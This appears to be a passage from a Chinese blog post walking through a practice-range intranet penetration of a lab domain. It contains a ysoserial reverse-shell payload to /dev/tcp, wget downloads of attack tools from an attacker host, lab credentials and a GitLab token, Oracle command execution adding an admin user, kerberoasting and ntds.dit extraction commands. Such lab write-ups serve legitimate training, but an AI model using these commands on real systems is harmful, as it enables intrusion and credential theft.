<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">1098</span> CommonsCollections6 <span class="hljs-string">&quot;bash -c &#123;echo,base编码后的bash -i &amp;&gt; /dev/tcp/ip/4444 0&gt;&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br>nc -lvnp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120095951290.png" srcset="/img/loading.gif" lazyload alt="image-20241120095951290"></p>
<p>远程下载</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget -P <span class="hljs-regexp">/tmp http:/</span><span class="hljs-regexp">/ip:1234/</span>agent_linux_x64<br>wget -P <span class="hljs-regexp">/tmp http:/</span><span class="hljs-regexp">/ip:1234/</span>fscan<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120100550341.png" srcset="/img/loading.gif" lazyload alt="image-20241120100550341"></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.13.6</span> DC<br><span class="hljs-number">172.22.13.28</span> web mysql弱口令<br><span class="hljs-number">172.22.13.57</span> Centos<br></code></pre></td></tr></table></figure>

<p>根据提示NFS</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120100841192.png" srcset="/img/loading.gif" lazyload alt="image-20241120100841192"></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">proxychains4 -q showmonut -e <span class="hljs-number">172.22</span>.<span class="hljs-number">13.57</span><br>proxychains4 -q mount -t nfs <span class="hljs-number">172.22</span>.<span class="hljs-number">13.57</span><span class="hljs-symbol">:/home/joyce</span> temp -o nolock<br></code></pre></td></tr></table></figure>

<p>不知道什么原因 kali上挂载失败</p>
<p>尝试在靶机上下载的时候shell坏了 又得重开靶场环境</p>
<h2 id="privilege"><a href="#privilege" class="headerlink" title="privilege"></a>privilege</h2><p>fscan扫描到<a target="_blank" rel="noopener" href="http://www.zip泄露/">www.zip泄露</a></p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span> );<br><br><span class="hljs-comment">/** Database password */</span><br><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;3%I$A*gl&amp;9^b#&#x27;</span> );<br><br><span class="hljs-comment">/** Database hostname */</span><br><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span> );<br></code></pre></td></tr></table></figure>

<p>拿到数据库密码后连不上 继续收集信息</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120141917493.png" srcset="/img/loading.gif" lazyload alt="image-20241120141917493"></p>
<p>发现一个任意文件读和一个phpinfo</p>
<p>根据题目给出的C:\ProgramData\Jenkins.jenkins</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/20240124143239-5ee04ddc-ba82-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>去读取密码<img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120142429062.png" srcset="/img/loading.gif" lazyload alt="image-20241120142429062"></p>
<p>RCE</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120142623207.png" srcset="/img/loading.gif" lazyload alt="image-20241120142623207"></p>
<p>windows环境 可以远程下载cs&#x2F;msf马执行 比较麻烦  也可以选择加用户开3389</p>
<p>这里用cs的web投递 通过以下网站编码payload 这一步卡了很久</p>
<p><a target="_blank" rel="noopener" href="https://r0yanx.com/tools/java_exec_encode/">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T</a></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120144109238.png" srcset="/img/loading.gif" lazyload alt="image-20241120144109238"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120144401211.png" srcset="/img/loading.gif" lazyload alt="image-20241120144401211"></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.14.11</span> DC<br><span class="hljs-number">172.22.14.16</span> web gitlab<br><span class="hljs-number">172.22.14.31</span> ORACLE<br><span class="hljs-number">172.22.14.46</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120145545582.png" srcset="/img/loading.gif" lazyload alt="image-20241120145545582"></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">提示去找jenkins中的gitlab api <span class="hljs-built_in">token</span> <br>f12可以看到<br>AQAAABAAAAAg9+<span class="hljs-number">7</span>GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh<br></code></pre></td></tr></table></figure>

<p>但是用设定功能可以直接抓到明文token</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120145843227.png" srcset="/img/loading.gif" lazyload alt="image-20241120145843227"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">glpat</span>-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2<br></code></pre></td></tr></table></figure>

<p>对gitlab有点陌生 跟着wp打</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">访问仓库接口<br>proxychains4 curl --silent --header <span class="hljs-string">&quot;PRIVATE-TOKEN: glpat-7kD_qLH2PiQv_ywB9hz2&quot;</span>  <span class="hljs-string">&quot;http://172.22.14.16/api/v4/projects/&quot;</span> | jq | grep <span class="hljs-string">&quot;http_url_to_repo&quot;</span><br>git下载仓库<br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/i</span>nternal-secret.git <br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/</span>xradmin.git <br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/</span>awenode.git <br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/</span>xrwiki.git <br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/gitlab-instance-23352f48/</span>Monitoring.git<br></code></pre></td></tr></table></figure>

<p>找到oracle密码</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">master:</span><br><span class="hljs-symbol">	url:</span> jdbc:oracle:thin:@<span class="hljs-number">172.22</span><span class="hljs-number">.14</span><span class="hljs-number">.31</span>:<span class="hljs-number">1521</span>/orcl<br><span class="hljs-symbol">	username:</span> xradmin<br><span class="hljs-symbol">	password:</span> fcMyE8t9E4XdsKf<br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120151659060.png" srcset="/img/loading.gif" lazyload alt="image-20241120151659060"></p>
<p>odat打 mdut一直执行不了命令</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains4 odat dbmsscheduler -s <span class="hljs-number">172.22</span>.<span class="hljs-number">14.31</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1521</span> -d ORCL -U xradmin -P fcMyE8t9E4XdsKf <span class="hljs-attr">--sysdba</span> <span class="hljs-attr">--exec</span> <span class="hljs-string">&#x27;net user qwq Qq123456. /add&#x27;</span><br>proxychains4 odat dbmsscheduler -s <span class="hljs-number">172.22</span>.<span class="hljs-number">14.31</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1521</span> -d ORCL -U xradmin -P fcMyE8t9E4XdsKf <span class="hljs-attr">--sysdba</span> <span class="hljs-attr">--exec</span> <span class="hljs-string">&#x27;net localgroup Administrators qwq /add&#x27;</span><br></code></pre></td></tr></table></figure>

<p>远程登录拿flag</p>
<p>还剩下一台成员机器 一台域控</p>
<p>利用刚刚找到的密码本</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120153357742.png" srcset="/img/loading.gif" lazyload alt="image-20241120153357742"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120153504419.png" srcset="/img/loading.gif" lazyload alt="image-20241120153504419"></p>
<p>XR-0923 | zhangshuai | wSbEajHzZs</p>
<p>(这个zhangshuai居然不是域用户,nxc和rdp都连了好久没通，nxc需要 –local-auth)</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120155015769.png" srcset="/img/loading.gif" lazyload alt="image-20241120155015769"></p>
<p>发现该用户没有可利用的权限，想到利用winrm 5985端口</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2080">奇安信攻防社区-攻防技巧 | 域渗透中WinRM的技巧细节与利用</a></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120160119896.png" srcset="/img/loading.gif" lazyload alt="image-20241120160119896"></p>
<p>SeRestorePrivilege利用</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8">渗透技巧——Windows九种权限的利用</a></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120161526677.png" srcset="/img/loading.gif" lazyload alt="image-20241120161526677"></p>
<p>然后锁定用户 触发粘滞键</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120161559555.png" srcset="/img/loading.gif" lazyload alt="image-20241120161559555"></p>
<p>跟着wp 后面mimikatz获得机器用户ntlm hash后打kerberoasting</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains4 GetUserSPNs<span class="hljs-selector-class">.py</span> xiaorang.lab/<span class="hljs-string">&#x27;XR-0923$&#x27;</span> -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">14.11</span><br><br>proxychains impacket-GetUserSPNs xiaorang.lab/<span class="hljs-string">&#x27;XR-0923$&#x27;</span> -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">14.11</span> -request-user tianjing<br><br>hashcat -m <span class="hljs-number">13100</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span><br>得到<br>tianjing:DPQSXSXgh2<br></code></pre></td></tr></table></figure>

<p>用这个用户特权去打卷影拷贝</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120164637570.png" srcset="/img/loading.gif" lazyload alt="image-20241120164637570"></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752212">使用卷影拷贝服务提取 ntds.dit 的多种姿势-腾讯云开发者社区-腾讯云</a></p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">创建raj.dsh<br><span class="hljs-keyword">set</span> context <span class="hljs-comment">persistent nowriters</span><br>add <span class="hljs-comment">volume c: alias raj</span><br>create<br>expose <span class="hljs-comment">%raj% z:</span><br>编码<br>unix2dos <span class="hljs-comment">raj.dsh</span><br></code></pre></td></tr></table></figure>

<p>winrm连接靶机后</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gauss">diskshadow /s raj.dsh<br>RoboCopy /b z:\windows\ntds . ntds.dit<br>reg <span class="hljs-keyword">save</span> HKLM\<span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">system</span><br>download <span class="hljs-keyword">system</span><br>download ntds.dit<br>退出后<br>impacket-secretsdump -ntds ntds.dit -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>



<p>#知识点</p>
<p>横向exec  非约束委派rubeus certify证书提权 fastjson log4j三种方式 GetNPUsers和Getuserspn区别</p>
<p>约束委派和基于资源的约束委派</p>
<p>fscan -h -p 1-65535 -nobr -nopoc -no</p>
<img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241122165127294.png" srcset="/img/loading.gif" lazyload class="" title="image-20241122165127294">

<img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241122170246576.png" srcset="/img/loading.gif" lazyload class="" title="image-20241122170246576">

<img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241122173703193.png" srcset="/img/loading.gif" lazyload class="" title="image-20241122173703193">

<img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241122173727242.png" srcset="/img/loading.gif" lazyload class="" title="image-20241122173727242">



<p>161.12.0.58 50006-50010</p>
<p><a target="_blank" rel="noopener" href="http://10.10.4.2:3300/">http://10.10.4.2:3300/</a> maridb</p>
<p>10.10.4.2:12183 零信任登录</p>
<p><a target="_blank" rel="noopener" href="http://10.10.7.2:8891/%E6%99%BA%E6%85%A7%E6%94%BF%E5%8D%8F">http://10.10.7.2:8891/智慧政协</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="print-no-link">#内网渗透 应急响应</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>靶场</div>
      <div>http://example.com/2024/11/21/靶场/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>z2zQAQ</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年11月21日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/12/13/%E4%BA%91%E5%AE%89%E5%85%A8/" title="云安全">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">云安全</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/16/web%E7%9F%A5%E8%AF%86/" title="web知识">
                        <span class="hidden-mobile">web知识</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>



  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/z2z_custom/custom.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":240,"height":480},"mobile":{"show":false},"react":{"opacityDefault":1,"opacityOnHover":1},"log":false,"tagMode":false});</script></body>
</html>



<!--动态线条背景-->
<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>


<!-- 页面点击小红心，在末尾添加，避免找不到 -->
<script type="text/javascript" src="/js/click.js"></script>


